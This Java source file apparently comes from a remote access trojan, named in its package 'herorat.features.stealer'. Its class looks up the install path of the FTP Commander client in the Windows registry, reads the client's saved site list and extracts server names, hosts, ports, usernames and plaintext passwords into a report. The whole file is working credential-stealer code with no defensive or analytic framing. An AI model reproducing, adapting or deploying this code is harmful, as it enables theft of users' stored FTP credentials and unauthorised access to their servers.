package net.herorat.features.stealer;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class StealerFTPCommander
{
	public static String getLogin()
	{
		try
		{
			String os = System.getProperty("os.name", "").toLowerCase();
			if (os.contains("win"))
			{
				String path = Registry.readRegistry("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\FTP Commander", "UninstallString");
				if (path != null)
				{
					path = path.replace("uninstall.exe", "Ftplist.txt");
				
					BufferedReader br = new BufferedReader(new FileReader(new File(path)));
					String t;
					StringBuffer buffer_encrypted = new StringBuffer();
					while((t = br.readLine()) != null) buffer_encrypted.append(t);
	
					Pattern[] pattern = new Pattern[] {
						Pattern.compile("Name=\\s*\"?(.*?);Server=", 2),
						Pattern.compile(";Server=\\s*\"?(.*?);Port=", 2),
						Pattern.compile(";Port=\\s*\"?(.*?);Password=", 2),
						Pattern.compile(";Password=\\s*\"?(.*?);User=", 2),
						Pattern.compile(";User=\\s*\"?(.*?);Anonymous=", 2)
					};
					
					StringBuffer buffer = new StringBuffer();
					buffer.append("------- FTP Commander -------\n");
					Matcher[] matcher = new Matcher[] { pattern[0].matcher(buffer_encrypted.toString()), pattern[1].matcher(buffer_encrypted.toString()), pattern[2].matcher(buffer_encrypted.toString()), pattern[3].matcher(buffer_encrypted.toString()), pattern[4].matcher(buffer_encrypted.toString()) };
					while ( matcher[0].find() && matcher[1].find() && matcher[2].find() && matcher[3].find() )
					{
						buffer.append("Name: " + matcher[0].group(1) + "\n");
						buffer.append("Server: " + matcher[1].group(1) + "\n");
						buffer.append("Port: " + matcher[2].group(1) + "\n");
						buffer.append("Password: " + matcher[3].group(1) + "\n");
						buffer.append("Username: " + matcher[4].group(1) + "\n");
					}
					buffer.append("-----------------------------\n\n");

					return buffer.toString();
				}
			}
		}
		catch (Exception e) {}

		return "";
	}
}